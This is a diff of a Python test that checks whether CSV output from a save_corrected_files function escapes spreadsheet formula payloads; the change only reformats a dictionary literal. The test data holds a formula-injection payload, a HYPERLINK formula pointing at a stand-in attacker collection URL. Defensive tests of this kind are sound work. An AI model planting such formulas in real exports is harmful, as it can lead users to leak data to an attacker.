@@ -188,11 +188,7 @@ def test_save_corrected_files_escapes_malicious_cells(tmp_path):
     """CSV output from save_corrected_files must neutralize formula payloads."""
     raw_file = str(tmp_path / "S26_Y01.txt")
     payload = '=HYPERLINK("http://attacker.example/collect","click")'
-    raw_dataframes = {
-        raw_file: pd.DataFrame(
-            {0: [1, 2], 1: [payload, "safe"]}
-        )
-    }
+    raw_dataframes = {raw_file: pd.DataFrame({0: [1, 2], 1: [payload, "safe"]})}
     applied_corrections = [{"File_Corrected": output_file_name(raw_file)}]
     raw_file_map = {"S26": {1: raw_file}}
 
